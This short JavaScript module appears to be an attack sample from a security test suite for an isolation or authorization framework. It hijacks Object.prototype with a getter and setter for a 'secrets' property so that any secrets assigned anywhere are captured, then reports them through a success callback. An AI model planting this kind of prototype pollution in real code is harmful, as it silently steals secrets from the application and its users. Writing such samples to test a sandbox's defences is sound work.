let stolen;

// grab all secrets, because of override mistake
Object.defineProperty(Object.prototype, "secrets", {
  get: () => stolen,
  set: (v) => {
    stolen = v;
  },
});

export const attack = (authzManager, success) => {
  if (stolen) {
    success(stolen);
  }
};
